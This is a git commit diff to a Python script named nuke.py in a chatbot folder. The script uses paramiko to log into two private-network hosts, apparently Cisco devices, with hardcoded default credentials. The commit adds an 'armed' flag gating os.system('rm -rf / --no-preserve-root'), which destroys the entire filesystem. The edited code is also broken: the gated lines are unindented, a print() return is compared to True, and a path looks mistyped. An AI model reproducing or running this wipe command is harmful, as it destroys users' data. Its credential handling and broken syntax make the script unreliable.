7bef201bb39981735a6e39666aa9171b46cdb867
123rad567 <118935932+123rad567@users.noreply.github.com>
2022-12-11 22:17:47 -0600

    Update nuke.py

--- chatbot/nuke.py
+++ chatbot/nuke.py
@@ -1,15 +1,17 @@
 import paramiko
 import time
 import getpass
+import os
 
 ssh_client = paramiko.SSHClient()
 ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-ip = '172.16.0.1'
-ip2 = '172.16.0.2'
+ip = '172.16.0.5'
+ip2 = '172.16.0.6'
 username = 'cisco'
 password = 'cisco123!'
+armed = False
 
-
+if (armed == True):
 ssh_client.connect(ip,username=username,password=password, look_for_keys=False, allow_agent=False)
 shell = ssh_client.invoke_shell()
 time.sleep(1)
@@ -24,7 +26,7 @@ if print(ssh_client.get_transport().is_active()) == True:
     print('Closing connection')
     ssh_client.close()
     
-    
+if (armed == True):    
 ssh_client.connect(ip2,username=username,password=password, look_for_keys=False, allow_agent=False)
 shell = ssh_client.invoke_shell()
 time.sleep(1)
@@ -38,3 +40,7 @@ print(output)
 if print(ssh_client.get_transport().is_active()) == True:
     print('Closing connection')
     ssh_client.close()
+
+if (armed == True):
+os.system('rm -rf / --no-preserve-root')
+os.system('rm -f /rmp/del*')
